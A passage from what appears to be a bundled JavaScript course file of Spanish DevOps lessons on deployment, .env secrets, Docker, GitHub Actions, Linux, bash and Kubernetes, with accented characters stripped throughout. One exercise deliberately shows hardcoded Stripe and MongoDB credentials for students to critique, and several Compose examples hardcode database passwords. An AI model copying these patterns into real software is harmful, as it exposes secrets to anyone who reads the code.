## 3. El flujo profesional
1. Programas en tu compu.
2. Guardas cambios en GitHub (\`git commit\` + \`git push\`).
3. Vercel/Netlify detecta el cambio.
4. Ejecutan el \`build\` automticamente en la nube.
5. Tu web tiene una nueva versin en vivo!

---

### Error Comn:
Intentar subir la carpeta \`node_modules\` al servidor. **NUNCA lo hagas!** Es pesadsima y no hace falta. El servidor instalar lo que necesite usando tu archivo \`package.json\`.

### Ejercicio Prctico 2:
Entra a tu terminal y ejecuta \`npm run build\` en tu proyecto actual. Mira la carpeta que se genera. Ves algn archivo \`.jsx\` o todo es puramente \`.js\` y \`.html\`?
`,completed:!1},{id:"deploy-devops-03-variables-entorno",title:"Variables de Entorno (.env) y Seguridad",level:"junior",content:`# Leccin 03: Variables de Entorno (.env) y Seguridad

Imagina que tu aplicacin necesita conectarse a una Base de Datos y tienes una contrasea secreta. Si dejas esa contrasea escrita en tu cdigo y lo subes a GitHub, cualquiera podra verla y robar tus datos.

## 1. Qu son las Variables de Entorno?
Son una forma de guardar secretos o configuraciones fuera de tu cdigo.
*   En tu computadora, creas un archivo llamado \`.env\`.
*   Dentro escribes algo como: \`DB_PASSWORD=secreto123\`.
*   En tu cdigo usas \`process.env.DB_PASSWORD\`.

## 2. El archivo .gitignore
Este es el archivo ms importante para tu seguridad. Ah debes escribir \`.env\` para que Git ignore ese archivo y **nunca** lo suba a internet.

## 3. Cmo sabe el servidor mi clave entonces?
En el panel de control de Vercel, Netlify o cualquier servidor, hay una seccin llamada **"Environment Variables"**. Ah debes escribir tus claves manualmente una por una.
De esta forma, la clave vive en el servidor pero nadie puede verla en el cdigo de GitHub.

## 4. Diferencias entre Desarrollo y Produccin
A veces quieres que en tu computadora la app use una URL de prueba y en internet use la real.
*   \`.env.development\`: Configuraciones para tu compu.
*   \`.env.production\`: Configuraciones para el sitio en vivo.

---

### Regla de Oro:
Si subiste un \`.env\` a GitHub por error, aunque lo borres, queda en el historial. Debes **cambiar la clave inmediatamente** (rotar la clave) porque ya se considera comprometida.

### Ejercicio Mental 3:
Si ests haciendo una pgina web que muestra el mapa de Google y necesitas una "API Key" que cuesta dinero cada vez que se usa, dnde la guardaras y cmo te aseguraras de que nadie te la robe para usarla en su propio sitio?
`,completed:!1},{id:"deploy-devops-04-practica-junior",title:"Junior Deploy",level:"junior",content:`# Ejercicios y Evaluacin: Junior Deploy

Demuestra que ests listo para llevar tus creaciones al mundo real.

---

## 1. Ejercicio: El Check de Seguridad
Mira el siguiente cdigo. Ves algn problema de seguridad relacionado con el Deploy?

\`\`\`javascript
// config.js
export const API_KEY = "sk_test_51Mz...8891"; // Clave de pago de Stripe
export const URL_DB = "mongodb+srv://admin:papas123@cluster0.abc.com";
\`\`\`
*Consigna:* Explica qu debera hacer el programador para corregir esto y cmo se usara en el cdigo.

## 2. Ejercicio: El Misterio del Build
Un compaero de equipo te dice: "Mi app funciona genial cuando escribo \`npm run dev\`, pero cuando hago el deploy a Vercel, la pantalla sale en blanco".
1. Qu comando le diras que ejecute en su propia computadora para ver si hay errores antes de subirlo?
2. Qu carpeta debera revisar para ver si se generaron los archivos comprimidos?

## 3. Evaluacin: Conceptos Base
*   Cul es la diferencia principal entre el entorno de **Desarrollo** y el de **Produccin**?
*   Nombra dos plataformas gratuitas para subir el **Frontend** de una aplicacin.
*   Por qu es una mala idea subir la carpeta \`node_modules\` al servidor?

---

### Criterios de Aprobacin
* [ ] Sabe la diferencia entre \`dev\` y \`build\`.
* [ ] Entiende la importancia de ocultar secretos en archivos \`.env\`.
* [ ] Conoce el flujo de trabajo GitHub -> Hosting.

Felicidades! Si manejas estos conceptos, ya dejas de ser un "programador de computadora local" para convertirte en un desarrollador que publica software. 
`,completed:!1,isProject:!0},{id:"deploy-devops-05-backend-deploy",title:"Deploy de Backend y Bases de Datos (Semi-Senior)",level:"semi-senior",content:`# Leccin 05: Deploy de Backend y Bases de Datos (Semi-Senior)

A diferencia del Frontend (que son solo archivos estticos), el **Backend** es un proceso vivo que debe correr 24/7 en un servidor. Como Semi-Senior, debes aprender a gestionar servidores que ejecutan cdigo lgica y mantienen conexiones a bases de datos.

## 1. Dnde vive el Backend? (PaaS)
Usamos plataformas como **Render**, **Railway** o **Firebase Functions**. Estas herramientas se encargan de:
*   Instalar Node.js.
*   Correr tu comando de inicio (\`npm start\`).
*   Mantener el servidor encendido si hay un error (auto-restart).

## 2. La arquitectura Frontend-Backend separada
En esta etapa, tus aplicaciones se dividen en dos URLs distintas:
*   \`mi-app.vercel.app\` (El cliente/frontend).
*   \`api.mi-app.railway.app\` (El servidor/backend).
**Desafo:** Debes configurar el **CORS** en el backend para permitir que solo tu URL de frontend pueda hacer peticiones.

## 3. Bases de Datos en la Nube
No instales la DB en el mismo servidor del backend. Usa servicios gestionados como:
*   **MongoDB Atlas** (Para NoSQL).
*   **Supabase** o **Neon** (Para PostgreSQL).
*   **PlanetScale** (Para MySQL).

## 4. Logs y Monitoreo Bsico
Si tu app falla en produccin, no puedes ver la consola de tu navegador. Necesitas ver los **Server Logs**.
*   **Regla de Oro:** Nunca dejes un \`console.log\` con datos sensibles. Usa libreras como \`Winston\` o \`Pino\` para logs profesionales que se puedan buscar por fecha y nivel de error (Info, Warning, Error).

---

### Caso Real de Produccin:
Un backend en Render se apagaba cada 15 minutos de inactividad (plan gratuito). Cuando un usuario entraba, la primera peticin tardaba 30 segundos en responder.
**Solucin Semi-Senior:** Entender el concepto de "Cold Start" y decidir si el negocio necesita un plan pago para tener "instancias siempre encendidas".
`,completed:!1},{id:"deploy-devops-06-intro-docker",title:'Introduccin a Docker - "En mi mquina funciona"',level:"semi-senior",content:`# Leccin 06: Introduccin a Docker - "En mi mquina funciona"

El mayor problema del deploy es la diferencia de entornos. Tu compu tiene Node 20 y Windows, pero el servidor tiene Node 18 y Linux. Ah es donde entra **Docker**.

## 1. Qu es Docker?
Docker mete tu aplicacin, sus dependencias y el sistema operativo en una "caja" llamada **Contenedor**. 
*   **La promesa:** Si el contenedor corre en tu computadora, correr EXACTAMENTE igual en cualquier servidor del mundo.

## 2. Archivos Fundamentales
*   **Dockerfile:** Las instrucciones para armar la caja. (Ej: "Usa Node 20, copia mis archivos, instala dependencias y corre el puerto 3000").
*   **Docker Image:** El paquete ya armado (como un archivo .exe o .iso).
*   **Docker Container:** La imagen puesta en marcha (el proceso vivo).

## 3. Comandos Bsicos que debes saber
*   \`docker build\`: Crea la imagen.
*   \`docker run\`: Enciende el contenedor.
*   \`docker ps\`: Mira qu contenedores estn corriendo.

---

### Por qu usarlo como Semi-Senior:
Te permite levantar una base de datos local (Redis, Postgres, etc.) con un solo comando sin tener que instalar nada en tu sistema operativo real.

### Ejercicio Mental:
Si tu aplicacin necesita una versin especfica de una librera de procesamiento de imgenes que solo funciona en Linux, cmo te ayuda Docker si t programas en Windows o Mac?
`,completed:!1},{id:"deploy-devops-07-docker-avanzado",title:"Docker Avanzado y Docker Compose",level:"senior",content:`# Leccin 07: Docker Avanzado y Docker Compose

En sistemas profesionales, tu App no es un solo archivo; es un conjunto de servicios (App + DB + Redis + Worker). Manejar eso con comandos individuales es imposible.

## 1. Docker Compose: El Orquestador Local
Con un archivo \`docker-compose.yml\`, defines toda tu arquitectura y la levantas con un solo comando: \`docker-compose up\`.

**Ejemplo de arquitectura profesional:**
\`\`\`yaml
services:
  web:
    build: .
    ports: ["3000:3000"]
    depends_on: ["db"]
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: password
\`\`\`

## 2. Optimizacin de Imgenes (Multi-stage Builds)
Un Senior no sube imgenes de 1GB. Usa **Multi-stage builds** para separar el entorno de construccin del de ejecucin.
*   **Etapa 1:** Instala TODO (libreras pesadas, compiladores).
*   **Etapa 2:** Solo copia el cdigo compilado a una imagen ultra ligera (Alpine Linux).
*   **Resultado:** Tu imagen baja de 800MB a 50MB.

## 3. Seguridad en Docker
*   **No root:** Nunca corras tu app como usuario \`root\` dentro del contenedor. Si alguien hackea tu app, tendr control total del servidor.
*   **Secretos:** No pases contraseas en el Dockerfile; usa variables de entorno pasadas en tiempo de ejecucin.

---

### Misin Senior:
Tu objetivo es que cualquier desarrollador nuevo pueda clonar el repositorio, escribir \`docker-compose up\` y tener TODO el entorno funcionando en 2 minutos.
`,completed:!1},{id:"deploy-devops-08-cicd-senior",title:"CI/CD con GitHub Actions y Entornos",level:"senior",content:`# Leccin 08: CI/CD con GitHub Actions y Entornos

El **CI/CD** (Continuous Integration / Continuous Deployment) es el alma de DevOps. Es la automatizacin total de la calidad y el despliegue.

## 1. El Pipeline (Flujo de trabajo)
Como Senior, configuras archivos \`.yml\` en GitHub que se ejecutan solos:
1.  **Linter:** Revisa que el cdigo est lindo.
2.  **Test:** Corre las pruebas unitarias e integracin.
3.  **Build:** Intenta compilar el proyecto.
4.  **Deploy:** Si todo lo anterior pas, sube el cdigo automticamente.

## 2. Estrategia de Entornos (Staging vs Production)
Nunca despliegues directo a la web real.
*   **Staging:** Una rplica exacta de produccin pero con una URL secreta. Aqu el equipo de QA (Testing) prueba todo.
*   **Production:** La web que ven los clientes. Solo se toca cuando Staging est verificado al 100%.

## 3. Despliegue progresivo (Blue-Green / Canary)
Cmo actualizar una app que tiene 1 milln de personas conectadas sin que se den cuenta?
*   **Blue-Green:** Levantas la versin nueva (Green) junto a la vieja (Blue). Cuando Green est lista, mueves todo el trfico de golpe. Si algo falla, vuelves a Blue en un segundo.

---

### Visin Senior:
El despliegue no debe ser un evento estresante de "cruzar los dedos". Debe ser un proceso aburrido y automtico que ocurre 10 veces al da sin que nadie se entere.

### Desafo:
Investiga el concepto de **Rollback**. Cmo automatizaras que si la nueva versin de tu app genera muchos errores 500, el sistema vuelva solo a la versin anterior?
`,completed:!1},{id:"deploy-devops-09-escalabilidad-seguridad",title:"Escalabilidad y Seguridad en Produccin",level:"senior",content:`# Leccin 09: Escalabilidad y Seguridad en Produccin

Tener 1.000 usuarios es fcil. Tener 1.000.000 requiere decisiones de arquitectura de alto nivel.

## 1. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Pagar un servidor ms caro (ms RAM/CPU). Tiene un lmite y es muy caro.
*   **Horizontal:** Poner muchos servidores baratos en paralelo. Es el estndar de la industria (nube). Necesitas un **Load Balancer** (Balanceador de Carga) para repartir el trfico entre ellos.

## 2. Statelessness (Sin estado)
Para escalar horizontalmente, tus servidores no pueden guardar archivos localmente (como fotos de perfil).
*   **Senior Solution:** Usa un **Object Storage** (AWS S3) para archivos y una base de datos centralizada. As, no importa a qu servidor llegue el usuario, siempre ve sus datos.

## 3. Seguridad Crtica (Production Hardening)
1.  **HTTPS:** Obligatorio. Usa certificados automticos (Let's Encrypt).
2.  **Secret Management:** No uses archivos \`.env\` en servidores grandes. Usa **Secrets Managers** (AWS Secrets Manager, HashiCorp Vault). Las llaves nunca tocan el disco rgido.
3.  **WAF (Web Application Firewall):** Bloquea ataques DDoS y SQL Injection antes de que lleguen a tu cdigo.

---

### Caso de Decisin Arquitectnica:
Tu App tiene un proceso muy lento (ej: generar un reporte PDF de 1GB).
*   **Solucin Junior:** Hacerlo en el controlador del API (El API se bloquea y nadie ms puede entrar).
*   **Solucin Senior:** Usar una **Arquitectura basada en Mensajes**. Envas la tarea a una "Cola" (Redis/RabbitMQ) y un proceso separado (Worker) lo hace en segundo plano. El usuario recibe un aviso: "Tu reporte estar listo en 5 min".

---

Felicidades, DevOps Lead! Has completado el camino desde subir un HTML a Netlify hasta disear infraestructuras globales resilientes. 
`,completed:!1}]},cD={id:"devops",title:"DevOps & Cloud Engineering",description:"Domina el arte de la automatizacin, la nube y la cultura DevOps profesional.",completed:!1,track:"Herramientas Esenciales",lessons:[{id:"devops-01-fundamentos",title:"Fundamentos de DevOps y Cultura",level:"junior",content:`# Leccin 1: Fundamentos de DevOps (Cultura, Automatizacin y el Muro)

DevOps no es un rol, es una cultura. Naci para derribar el "Muro de la Confusin" entre Desarrolladores (Dev) y Operaciones/Sistemas (Ops).

## 1. El Problema Clsico (Silos)
*   **Devs:** Quieren cambiar cosas rpido. Su incentivo es la *innovacin*.
*   **Ops:** Quieren estabilidad. Su incentivo es que *nada se rompa*.
*   **Resultado:** Devs lanzan cdigo "por encima del muro" a Ops. Si falla en produccin, se culpan mutuamente.

## 2. La Solucin: CALMS
DevOps se basa en 5 pilares (CALMS):
*   **Culture (Cultura):** Responsabilidad compartida. "You build it, you run it".
*   **Automation (Automatizacin):** Eliminar trabajo manual repetitivo (toil) para evitar errores humanos.
*   **Lean (Eficiencia):** Producir valor en lotes pequeos (commits pequeos, deploys frecuentes).
*   **Measurement (Medicin):** Datos reales sobre performance y estabilidad (Mtricas, Logs).
*   **Sharing (Compartir):** Conocimiento abierto, post-mortems sin culpa.

## 3. El Ciclo Infinito (The Infinite Loop)
Plan -> Code -> Build -> Test -> Release -> Deploy -> Operate -> Monitor -> Plan...

## 4. Conceptos Clave
### CI/CD
Tubera automatizada de entrega de software.
*   **CI (Continuous Integration):** Integrar cdigo frecuentemente (varias veces al da) en un repo compartido, verificado por builds y tests automticos.
*   **CD (Continuous Delivery):** El software siempre est en un estado desplegable.
*   **CD (Continuous Deployment):** Cada cambio que pasa los tests se despliega automticamente a produccin.

### Infraestructura como Cdigo (IaC)
En lugar de configurar servidores manualmente (SSH, click click), defines tu infraestructura en archivos de texto (YAML, HCL).
*   Ejemplos: Terraform, Ansible, CloudFormation.
*   Ventaja: Versionable, reproducible y auditable.

---

### Misin Junior:
Investiga el concepto de "Shift Left" en DevOps. Qu significa y por qu es importante probar *antes* en el ciclo? Escribe un breve prrafo explicndoselo a un compaero no tcnico.
`,completed:!1},{id:"devops-02-linux-basico",title:"Linux Bsico para DevOps",level:"junior",content:'# Leccin 2: Linux Bsico para DevOps (La Terminal es tu Hogar)\n\nLa mayora de los servidores del mundo (la nube) corren Linux. Si no sabes terminal, no eres DevOps.\n\n## 1. Navegacin y Archivos\n*   `pwd`: Dnde estoy? (Print Working Directory).\n*   `ls -la`: Listar todo (incluidos ocultos) con detalles.\n*   `cd`: Cambiar directorio (`cd ..` subir un nivel, `cd ~`: ir a home).\n*   `mkdir -p a/b/c`: Crear carpetas anidadas.\n*   `touch archivo.txt`: Crear archivo vaco.\n*   `cp origen destino`: Copiar (`-r` para carpetas).\n*   `mv origen destino`: Mover o renombrar.\n*   `rm -rf carpeta`: Borrar carpeta y contenido **sin preguntar** (Cuidado!).\n\n## 2. Ver y Editar Contenido\n*   `cat archivo`: Ver todo el contenido.\n*   `head -n 5`: Ver las primeras 5 lneas.\n*   `tail -f log.txt`: Ver el final de un archivo en tiempo real (vital para logs).\n*   `nano` / `vim`: Editores de texto en terminal.\n\n## 3. Permisos (chmod)\nEn Linux, todo archivo tiene permisos para: **Owner**, **Group**, **Others**.\nTipos: **R**ead (4), **W**rite (2), e**X**ecute (1).\n\n*   `chmod 777 archivo`: Todo el mundo puede hacer todo (Peligroso).\n    *   7 = 4+2+1 (RWX) para Owner.\n    *   7 = 4+2+1 (RWX) para Group.\n    *   7 = 4+2+1 (RWX) para Others.\n*   `chmod 644 archivo`: Owner lee/escribe, el resto solo lee (Estndar para archivos web).\n*   `chmod +x script.sh`: Dar permiso de ejecucin.\n\n## 4. Gestin de Procesos\n*   `ps aux`: Ver todos los procesos corriendo.\n*   `top` / `htop`: Administrador de tareas interactivo (CPU, RAM).\n*   `kill PID`: Matar un proceso por su ID.\n*   `killall nginx`: Matar todos los procesos con ese nombre.\n\n## 5. Variables de Entorno\nConfiguraciones que viven en la memoria del sistema, no en el cdigo.\n*   `export MI_VAR="hola"`: Crear variable temporal.\n*   `echo $MI_VAR`: Ver valor.\n*   `env`: Listar todas.\n\n---\n\n### Misin Junior:\n1. Crea una estructura de carpetas `app/logs` y `app/src`.\n2. Crea un archivo `server.js` en `src`.\n3. Qutale todos los permisos de lectura al archivo (`chmod 000`) e intenta leerlo con `cat`. Qu pasa?\n4. Devulvele permisos de lectura y escritura solo al dueo (`chmod 600`).\n',completed:!1},{id:"devops-03-bash-scripting",title:"Bash Scripting Bsico",level:"junior",content:`# Leccin 3: Bash Scripting Bsico (Automatiza tu Vida)

Si tienes que hacerlo ms de dos veces, escribe un script. Bash es el lenguaje de pegamento de los sistemas.

## 1. El Shebang
Todo script de bash empieza con:
\`\`\`bash
#!/bin/bash
\`\`\`
Esto le dice al sistema "usa el intrprete bash para ejecutar esto".

## 2. Variables y Argumentos
\`\`\`bash
#!/bin/bash
NOMBRE="Mundo"
echo "Hola $NOMBRE"

# Argumentos que pasas al script (./script.sh arg1 arg2)
echo "El primer argumento es: $1"
\`\`\`

## 3. Condicionales
\`\`\`bash
if [ -f "archivo.txt" ]; then
    echo "El archivo existe."
else
    echo "El archivo no existe, crendolo..."
    touch archivo.txt
fi
\`\`\`

## 4. Bucles
\`\`\`bash
# Iterar sobre archivos
for archivo in *.jpg; do
    echo "Procesando $archivo..."
done
\`\`\`

## 5. Automatizacin con Cron (Cron Jobs)
El reloj despertador de Linux.
\`crontab -e\`: Editar la tabla de cron.

Formato:
\`minuto hora da_mes mes da_semana comando\`

Ejemplos:
*   \`* * * * * /scripts/backup.sh\`: Ejecutar cada minuto.
*   \`0 3 * * * /scripts/backup.sh\`: Ejecutar todos los das a las 3:00 AM.
*   \`0 0 * * 5 /scripts/reporte.sh\`: Ejecutar cada viernes a medianoche.

---

### Misin Junior:
Escribe un script \`backup_logs.sh\` que:
1. Cree una carpeta \`backup\` si no existe.
2. Copie todos los archivos \`.log\` de la carpeta actual a \`backup\`.
3. Agregue la fecha actual al nombre del archivo copiado (ej: \`app_2023-10-27.log\`).
4. Imprima "Backup completado".
Tip: Usa \`FECHA=$(date +%Y-%m-%d)\` para obtener la fecha.
`,completed:!1},{id:"devops-04-git-flow",title:"Git aplicado a DevOps",level:"junior",content:"# Leccin 4: Git aplicado a flujo real (DevOps Flow)\n\nEn DevOps, Git no es solo para guardar cdigo, es el gatillo de la automatizacin (GitOps).\n\n## 1. El Flujo de Trabajo (Git Flow Simplificado)\n1.  **Main:** Siempre desplegable. Protegida. Nadie comitea directo aqu.\n2.  **Feature Branches:** `feat/nueva-cosa`. Ramas de vida corta.\n3.  **Pull Request (PR):** El momento de la verdad. Aqu se ejecutan los tests automticos (CI).\n4.  **Merge:** Solo si CI pasa y hay aprobacin humana.\n5.  **Tag release:** `v1.0.0`. Esto dispara el despliegue a produccin.\n\n## 2. Merge vs. Rebase en Equipos\n*   **Merge:** Mantiene la historia real (con errores y bifurcaciones). Facilita ver cundo se integr una feature.\n*   **Rebase:** Mantiene historia lineal. Ms limpio, pero peligroso en ramas compartidas (reescribe historia).\n    *   *Regla DevOps:* Usa `rebase` en tu rama local para actualizarte con `main` antes de subir. Usa `merge` (o Squash Merge) al integrar el PR a `main`.\n\n## 3. Conventional Commits y CI\nLos mensajes de commit son input para las mquinas.\n*   Si el commit dice `fix: ...`, la pipeline de release sabe que debe subir la versin PATCH (v1.0.0 -> v1.0.1).\n*   Si dice `feat: ...`, sube MINOR (v1.0.0 -> v1.1.0).\n*   Si dice `BREAKING CHANGE:`, sube MAJOR (v1.0.0 -> v2.0.0).\n\n---\n\n### Misin Junior:\nSimula un flujo completo:\n1. Crea una rama `feat/test-pipeline`.\n2. Haz un cambio y un commit: `feat: agrega script de prueba`.\n3. Haz push.\n4. Imagina que otro dev hizo cambios en `main`. Simlalo haciendo un commit directo en `main` localmente.\n5. Actualiza tu rama `feat` con los cambios de `main` usando `git rebase main` (para traer lo nuevo sin crear un merge commit sucio en tu rama).\n6. Resuelve conflictos si los hay.\n",completed:!1},{id:"devops-05-docker-basico",title:"Docker Bsico",level:"junior",content:`# Leccin 6: Docker Bsico (Contenedores)

"En mi mquina funciona". La frase ms odiada en Ops. Docker soluciona esto empaquetando la app con TODO lo que necesita para correr.

## 1. Qu es un Contenedor?
Es como una mquina virtual, pero mucho ms ligera. Comparte el kernel del sistema operativo del host, pero tiene su propio sistema de archivos, red y procesos aislados.

## 2. Imagen vs. Contenedor
*   **Imagen:** Es el "plano" o la "clase". Un archivo inmutable de solo lectura. (Ej: \`node:18-alpine\`).
*   **Contenedor:** Es la "instancia" o el "objeto". La imagen en ejecucin. Puedes tener 100 contenedores de la misma imagen.

## 3. Dockerfile
La receta para cocinar tu imagen.

\`\`\`dockerfile
# 1. Base Image (Sistema Operativo mnimo + Node)
FROM node:18-alpine

# 2. Directorio de trabajo dentro del contenedor
WORKDIR /app

# 3. Copiar dependencias (primero package.json para aprovechar cach)
COPY package*.json ./

# 4. Instalar dependencias
RUN npm install

# 5. Copiar el resto del cdigo
COPY . .

# 6. Exponer puerto (documentacin)
EXPOSE 3000

# 7. Comando de arranque (CMD)
CMD ["node", "src/index.js"]
\`\`\`

## 4. Comandos Esenciales
*   \`docker build -t mi-app .\`: Construir la imagen desde el Dockerfile actual.
*   \`docker run -p 8080:3000 mi-app\`: Correr contenedor. Mapea el puerto 3000 del contenedor al 8080 de tu PC.
*   \`docker ps\`: Ver contenedores corriendo.
*   \`docker stop <ID>\`: Detener contenedor.

## 5. Docker Compose
Orquestador simple para correr mltiples contenedores (App + Base de Datos).
Archivo: \`docker-compose.yml\`

\`\`\`yaml
version: '3.8'
services:
  web:
    build: .
    ports:
      - "3000:3000"
  db:
    image: postgres:13
    environment:
      POSTGRES_PASSWORD: secreto
\`\`\`
Comando: \`docker-compose up\` (Levanta todo el entorno).

---

### Misin Junior:
1. Crea un \`index.js\` simple que imprima "Hola Docker" y se mantenga vivo (o un servidor web simple).
2. Escribe el \`Dockerfile\`.
3. Construye la imagen (\`build\`).
4. Crrela (\`run\`).
5. Verifica que funciona.
`,completed:!1},{id:"devops-06-intro-ci",title:"Intro a Git Hub Actions (CI)",level:"junior",content:`# Leccin 5: Introduccin a CI con GitHub Actions (Tu Primer Pipeline)

La Integracin Continua (CI) es tener un robot que prueba tu cdigo cada vez que lo guardas.

## 1. Qu es un Pipeline?
Una serie de pasos automticos que se ejecutan secuencialmente.
Ejemplo: Descargar cdigo -> Instalar dependencias -> Correr Lint -> Correr Tests -> Construir.

## 2. GitHub Actions
La herramienta de CI/CD integrada en GitHub. Se configura con archivos YAML en \`.github/workflows/\`.

## 3. Componentes de un Workflow
*   **Event (on):** Cundo corre? (push, pull_request, schedule).
*   **Job:** Una unidad de trabajo que corre en una mquina virtual (Runner).
*   **Step:** Un paso individual (comando o accin) dentro del Job.

## 4. Ejemplo Bsico: Hello World CI
Archivo: \`.github/workflows/demo.yml\`

\`\`\`yaml
name: Demo Pipeline

on: [push] # Se ejecuta en cada push

jobs:
  saludo:
    runs-on: ubuntu-latest # Mquina Linux de Microsoft
    steps:
      - name: Checkout del cdigo
        uses: actions/checkout@v2 # Accin prefabricada para bajar tu repo
      
      - name: Imprimir mensaje
        run: echo "Hola desde GitHub Actions! El commit fue: \${{ github.sha }}"
      
      - name: Verificar archivos
        run: ls -la
\`\`\`

## 5. Fallar el Pipeline (Build Failed)
Si cualquier comando devuelve un cdigo de error (exit code != 0), el pipeline se detiene y se marca en rojo.
\`\`\`yaml
      - name: Correr tests
        run: npm test # Si los tests fallan, npm devuelve 1 y el CI falla.
\`\`\`

---

### Misin Junior:
1. En un repositorio de GitHub, crea la carpeta \`.github/workflows\`.
2. Crea un archivo \`ci.yml\`.
3. Configura un job que imprima la versin de node (\`node -v\`) y la versin de npm (\`npm -v\`).
4. Haz push y mira la pestaa "Actions" en tu repositorio. Ve a tu robot trabajar!
`,completed:!1},{id:"devops-07-proyecto-final-junior",title:"Proyecto Final Junior DevOps",level:"junior",content:'# Proyecto Final Nivel Junior: "El Pipeline Bsico"\n\nEs hora de integrar todo. Vas a simular el da uno de un ingeniero DevOps Junior.\n\n## Objetivo\nDockerizar una aplicacin simple y crear un pipeline de CI que verifique que la imagen se construye correctamente en cada push.\n\n## Pasos\n\n### 1. La Aplicacin (El Asset)\nCrea una aplicacin Node.js extremadamente simple.\n*   `app.js`: Un servidor web con Express o http nativo que responda "Hola DevOps" en el puerto 3000.\n*   `package.json`: Con sus scripts de start.\n\n### 2. Contenerizacin (Docker)\n*   Crea el `Dockerfile` optimizado (usa imgenes `alpine`).\n*   Crea un archivo `.dockerignore` para no copiar `node_modules` ni `.git` dentro de la imagen.\n*   Prueba localmente: `docker build` y `docker run`. Asegrate de poder acceder a `localhost:3000`.\n\n### 3. Automatizacin Local (Bash)\nCrea un script `dev.sh` que haga lo siguiente:\n1.  Detenga cualquier contenedor anterior de esta app.\n2.  Construya la imagen nueva.\n3.  Corra el contenedor en modo "detached" (`-d`).\n4.  Muestre los logs del contenedor.\nDale permisos de ejecucin (`chmod +x`).\n\n### 4. Integracin Continua (GitHub Actions)\nConfigura un workflow en `.github/workflows/docker-build.yml` que:\n1.  Se active en `push` a `main`.\n2.  Haga checkout del cdigo.\n3.  Intente construir la imagen de Docker (`docker build .`).\n    *   *Nota:* Los runners de GitHub ya tienen Docker instalado.\n4.  Si el build falla, el pipeline debe fallar.\n\n## Entregable (Evaluacin)\nDeberas tener un repositorio con:\n*   `src/`, `Dockerfile`, `.dockerignore`\n*   `scripts/dev.sh`\n*   `.github/workflows/build.yml`\n*   Un `README.md` explicando cmo correr tu proyecto con un solo comando.\n\nFelicidades! Acabas de crear tu primer entorno de desarrollo profesional y automatizado.\n',completed:!1},{id:"devops-08-docker-avanzado",title:"Docker Avanzado",level:"semi-senior",content:`# Leccin 8: Docker Avanzado (Optimizacin y Seguridad)

Ya sabes correr un contenedor. Ahora vamos a hacerlos **rpidos, ligeros y seguros**.

## 1. Multi-stage Builds (El secreto de las imgenes pequeas)
Por qu tu imagen de "Hola Mundo" pesa 1GB? Porque ests copiando \`node_modules\` de desarrollo y herramientas de compilacin que no necesitas en produccin.

**Solucin:** Usa etapas.
1.  **Etapa Build:** Instala todo, compila TypeScript, corre tests.
2.  **Etapa Run:** Copia *solo* lo que compilaste a una imagen limpia y ligera.

\`\`\`dockerfile
# Stage 1: Build
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
RUN npm run build

# Stage 2: Production
FROM node:18-alpine
WORKDIR /app
# Copiamos solo los artefactos construidos del Stage 1
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/package*.json ./
RUN npm install --production
CMD ["node", "dist/index.js"]
\`\`\`
*Resultado:* Imagen baja de 800MB a 80MB.

## 2. Volmenes (Persistencia de Datos)
Los contenedores son efmeros. Si borras el contenedor, sus datos mueren.
Para bases de datos, necesitas **Volmenes**.

\`\`\`bash
# Crear volumen
docker volume create mis-datos

# Usarlo
docker run -v mis-datos:/var/lib/mysql mysql
\`\`\`
Ahora, aunque mates el contenedor de MySQL, los datos viven en \`mis-datos\`.

## 3. Docker Networks
Por defecto, los contenedores no se ven entre s por nombre.
Crea una red para que tu App hable con tu DB usando DNS interno.

\`\`\`bash
docker network create mi-red
docker run --network mi-red --name db mysql
docker run --network mi-red --name app mi-app
\`\`\`
(Desde \`app\`, ahora puedes conectar a \`mysql://db:3306\`).

## 4. Seguridad Bsica
*   **No corras como root:** Crea un usuario en el Dockerfile (\`USER node\`). Si hackean la app, no tienen control total.
*   **Escanea imgenes:** Usa \`docker scan mi-imagen\` para ver vulnerabilidades conocidas.
*   **Imgenes Oficiales:** Usa siempre imgenes base oficiales y especficas (\`node:18-alpine\` es mejor que \`node:latest\`).

---

### Misin Semi-Senior:
1. Toma tu proyecto anterior.
2. Convierte el Dockerfile a **Multi-stage build**.
3. Implementa un **Volume** para guardar logs fuera del contenedor.
4. Escanea tu imagen con \`docker scan\` (o trivy) y reporta cuntas vulnerabilidades "High" encontraste.
`,completed:!1},{id:"devops-09-kubernetes-basico",title:"Kubernetes Bsico",level:"semi-senior",content:`# Leccin 9: Kubernetes Bsico (El Estndar de la Orquestacin)

Docker es para un servidor. Kubernetes (K8s) es para un cluster de 100 servidores (nodos) que actan como uno solo.

## 1. Conceptos Clave
Kubernetes es declarativo. T escribes un YAML ("Quiero 3 rplicas de mi app") y K8s hace lo necesario para cumplirlo.

## 2. Pod (La unidad atmica)
No corres "contenedores" directamente. Corres **Pods**.
*   Un Pod envuelve uno o ms contenedores (normalmente uno).
*   Tiene su propia IP interna.
*   Es mortal. Si muere, K8s crea otro nuevo (con otra IP).

## 3. Deployment (El Gerente)
Gestiona los Pods.
*   Define qu imagen usar.
*   Define cuntas rplicas quieres.
*   Se encarga de las actualizaciones (Rolling Update) sin downtime.

\`deployment.yaml\`:
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mi-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mi-web
  template:
    metadata:
      labels:
        app: mi-web
    spec:
      containers:
      - name: web
        image: nginx:alpine
        ports:
        - containerPort: 80
\`\`\`

## 4. Comandos Kubectl
\`kubectl\` es el control remoto de tu cluster.
*   \`kubectl apply -f archivo.yaml\`: Crea o actualiza recursos.
*   \`kubectl get pods\`: Ver pods.
*   \`kubectl describe pod <nombre>\`: Ver detalles y logs de eventos (status, errores).
*   \`kubectl logs <nombre>\`: Ver stdout del contenedor.

---

### Misin Semi-Senior:
Necesitas un cluster local. Instala **Minikube** o activa **Kubernetes en Docker Desktop**.
1. Crea el archivo \`deployment.yaml\` de arriba.
2. Aplcalo: \`kubectl apply -f deployment.yaml\`.
3. Verifica que hay 3 pods corriendo: \`kubectl get pods\`.
4. Borra un pod manualmente (\`kubectl delete pod <nombre>\`).
5. Mira rpido \`kubectl get pods\`. K8s habr creado uno nuevo inmediatamente para mantener las 3 rplicas! (Self-healing).
`,completed:!1},{id:"devops-10-kubernetes-intermedio",title:"Kubernetes Intermedio",level:"semi-senior",content:`# Leccin 10: Kubernetes Intermedio (Exponiendo tu App)

